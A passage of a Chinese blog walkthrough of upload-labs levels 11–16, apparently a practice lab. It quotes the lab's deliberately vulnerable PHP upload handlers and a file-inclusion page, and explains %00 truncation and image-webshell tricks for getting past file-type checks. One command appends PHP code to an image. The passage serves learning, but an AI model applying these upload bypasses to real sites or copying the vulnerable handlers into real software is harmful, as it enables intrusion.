class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 源码</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>); <span class="comment">//获取文件后缀</span></span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];<span class="comment">//获取文件的复件，将附件重命名。</span></span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>; <span class="comment">//将文件重命名为随机文件名</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 大致逻辑为：将文件复制两份，一份用于获取文件的后缀名，一份用于重命名。</span></span><br></pre></td></tr></table></figure><p>这道题给了我一点做web的启发，就是参数对于用户可控这个问题，无论是post传参数还是get传参数，很多时候这种就是突破口，后面看到参数可控一定要非常注意。</p><h1 id="Less-12-00截断符绕过-POST方式"><a href="#Less-12-00截断符绕过-POST方式" class="headerlink" title="Less-12(%00截断符绕过-POST方式)"></a>Less-12(%00截断符绕过-POST方式)</h1><p>这道题好像也是使用%00截断符绕过？</p><p>看了看源码，也抓了下包，发现就是把参数<code>save_path</code>的提交方式从get换到了post，方法和上面的都是一样的。。</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20211003211208764.png" alt="burpsuite"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 源码，和Less-11几乎是一模一样的</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-13-检查图片文件头"><a href="#Less-13-检查图片文件头" class="headerlink" title="Less-13(检查图片文件头)"></a>Less-13(检查图片文件头)</h1><p>这关有三个要求，要求传三种格式的图片马都能成功解析才算过关</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20211003215942952.png" alt="access"></p><p>源码分成两个部分，一个是检查文件头，取出文件头的两个字节来进行判断，但是具体逻辑是取出两个字节，使用<code>unpack</code>函数将两个字节转换成两个十进制数的字符串形式，在将两个十进制字符串拼接转为整数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检测文件头函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先使用010Editor编辑好三种图片马，然后就可以绕过文件头检测。</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20211004222141926.png" alt="GIF"></p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20211004222211484.png" alt="PNG"></p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20211004222236681.png" alt="JPG"></p><p>这里需要控制参数<code>$img_path</code>，如果控制不了即使上传成功后缀名不对服务器也无法解析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里看了看，好像能修改的只有<code>date(&quot;YmdHis&quot;)</code>这里，但是不知道可不可以修改时间戳，之前看好像浏览器可以修改。也不对，网上看了看别人写的通关Pass，好像需要使用文件包含漏洞，这个我也不会，学web就是遇到什么学什么。</p><p>后面发现作者专门写了一个文件包含漏洞来使用上传的图片马（我没看见，眼睛是真的瞎。。），这道题也了解了点关于文件包含的知识，就是不管上传什么文件，<code>include</code>函数都会将那个文件当成php文件来解析，这就比厉害了，就这用有文件包含和文件上传漏洞的网页直接无解</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__file__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这关算是完成了，成功的制作了三种图片马并且成功上传，也了解了文件上传的知识，还是不错的。</p><h1 id="Less-14-PHP内置函数绕过-lt-image-type-to-extension-gt"><a href="#Less-14-PHP内置函数绕过-lt-image-type-to-extension-gt" class="headerlink" title="Less-14(PHP内置函数绕过&lt;image_type_to_extension&gt;)"></a>Less-14(PHP内置函数绕过&lt;image_type_to_extension&gt;)</h1><p>也是开始审计代码，毕竟什么都不知道（每做一关就吧使用的后门文件保存下来，到时候在写一个工具直接用工具去扫）</p><p>审源码，<code>function isImage</code>作用应该是测试文件是否为图片让后返回图片后缀名。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = getimagesize(<span class="variable">$filename</span>);<span class="comment">// 获取图片文件大小</span></span><br><span class="line">        <span class="variable">$ext</span> = image_type_to_extension(<span class="variable">$info</span>[<span class="number">2</span>]); <span class="comment">// 根据常量大小返回图片后缀名</span></span><br><span class="line">        <span class="keyword">if</span>(stripos(<span class="variable">$types</span>,<span class="variable">$ext</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getimagesize</code>函数的返回值，随便测试了下，使用的是png格式图片，返回了六个值，使用的数组中的第二个值，代表图片的类型</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20211007103350977.png" alt="var_dump"></p><p>PHP开发手册所有的图片格式代表的数字</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20211007103934519.png" alt="num_of_pictures"></p><p>我使用上一关制作的图片马不行，就直接echo命令将php代码写在一张图片的末尾，在上传发现可以，也能正常解析（这应该是最简单的方法）</p><p><code>echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt;&gt; 2.png</code></p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20211007104703577.png" alt="cat image"></p><p>在使用有文件包含漏洞的页面发现可以正常解析图片，这一关感觉才是正宗的图片马，之前检测文件头的并不是很有感觉，虽然也比较简单。</p><p>然后在做的时候审源码还是要一边审一边自己去尝试才是学得最快的，还有查php Manual。</p><h1 id="Less-15-PHP内置函数绕过-lt-exif-imagetype-gt"><a href="#Less-15-PHP内置函数绕过-lt-exif-imagetype-gt" class="headerlink" title="Less-15(PHP内置函数绕过&lt;exif_imagetype&gt;)"></a>Less-15(PHP内置函数绕过&lt;exif_imagetype&gt;)</h1><p>这关的检测图片函数名也叫<code>isImage</code>，但是写法和上一关的不一样了，用到了一个叫做<code>exif_imagetype</code>的函数，在php手册中是这样介绍的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = exif_imagetype(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../.config/Typora/typora-user-images/image-20211007105541228.png" alt="php_Manual"></p><p>读取图片的地一个字节然后检测标志，自己去测试下这个函数，其实就和上一关的<code>getimagesize</code>函数的作用差不多，都是返回代表图片后缀的后缀编号，下面贴<code>php Manual</code>的介绍。</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20211007110955414.png" alt="image_type_value"></p><p>使用14关制作的图片马就可以成功上传，然后使用文件包含漏洞去解析，emmmmm，感觉学到的东西很少唉。就感觉如果要过系统函数的检测那就直接在别的图片后面追加php代码然后使用文件上传漏洞去解析后面几关不知道是不是都能这样过。</p><h1 id="Less-16-图片二次渲染绕过"><a href="#Less-16-图片二次渲染绕过" class="headerlink" title="Less-16(图片二次渲染绕过)"></a>Less-16(图片二次渲染绕过)</h1><p>这次直接尝试使用之前的图片马，发现失效了，看看源码这关对图片做了什么骚操作。源码是相当长啊。里面不认识的函数写在下面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.basename(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= substr(strrchr(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromjpeg(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="variable">$newimagepath</span> = UPLOAD_PATH.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagejpeg(<span class="variable">$im</span>,<span class="variable">$newimagepath</span>);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="variable">$newfilename</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefrompng(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="variable">$newimagepath</span> = UPLOAD_PATH.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagepng(<span class="variable">$im</span>,<span class="variable">$newimagepath</span>);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="variable">$newfilename</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromgif(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="variable">$newimagepath</span> = UPLOAD_PATH.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagegif(<span class="variable">$im</span>,<span class="variable">$newimagepath</span>);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="variable">$newfilename</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span 